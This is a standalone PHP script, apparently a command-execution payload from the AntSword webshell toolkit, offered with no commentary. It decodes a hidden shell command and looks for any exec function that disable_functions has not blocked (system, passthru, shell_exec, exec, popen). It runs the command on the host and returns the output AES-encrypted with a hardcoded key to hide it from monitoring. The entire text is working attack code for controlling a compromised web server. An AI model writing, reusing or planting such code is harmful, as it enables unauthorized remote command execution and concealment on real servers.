<?php
@ini_set("display_errors", "0");
@set_time_limit(0);
function asenc($out)
{
    @session_start();
    $key = 'f5045b05abe6ec9b1e37fafa851f5de9';
    return @base64_encode(openssl_encrypt(base64_encode($out), 'AES-128-ECB', $key, OPENSSL_RAW_DATA));
}
function asoutput()
{
    $output = ob_get_contents();
    ob_end_clean();
    echo "0897d";
    echo @asenc($output);
    echo "60c97";
}
ob_start();
try {
    $p = base64_decode('L2Jpbi9zaA==');
    $s = base64_decode('Y2QgIi92YXIvd3d3L2h0bWwvdG1wIjtjZCAvdmFyL3d3dy9odG1sL3RtcC87ZWNobyBbU107cHdkO2VjaG8gW0Vd');
    $d = dirname($_SERVER["SCRIPT_FILENAME"]);
    $c = substr($d, 0, 1) == "/" ? "-c \"{$s}\"" : "/c \"{$s}\"";
    $r = "{$p} {$c}";
    function fe($f)
    {
        $d = explode(",", @ini_get("disable_functions"));
        if (empty($d)) {
            $d = array();
        } else {
            $d = array_map('trim', array_map('strtolower', $d));
        }
        return function_exists($f) && is_callable($f) && !in_array($f, $d);
    }
    function runcmd($c)
    {
        $ret = 0;
        if (fe('system')) {
            @system($c, $ret);
        } elseif (fe('passthru')) {
            @passthru($c, $ret);
        } elseif (fe('shell_exec')) {
            print @shell_exec($c);
        } elseif (fe('exec')) {
            @exec($c, $o, $ret);
            print join("\r\n", $o);
        } elseif (fe('popen')) {
            $fp = @popen($c, 'r');
            while (!@feof($fp)) {
                print @fgets($fp, 2048);
            }
            @pclose($fp);
        } elseif (fe('antsystem')) {
            @antsystem($c);
        } else {
            $ret = 127;
        }
        return $ret;
    }
    $ret = @runcmd($r . " 2>&1");
    print $ret != 0 ? "ret={$ret}" : "";
} catch (Exception $e) {
    echo "ERROR://" . $e->getMessage();
}
asoutput();
die;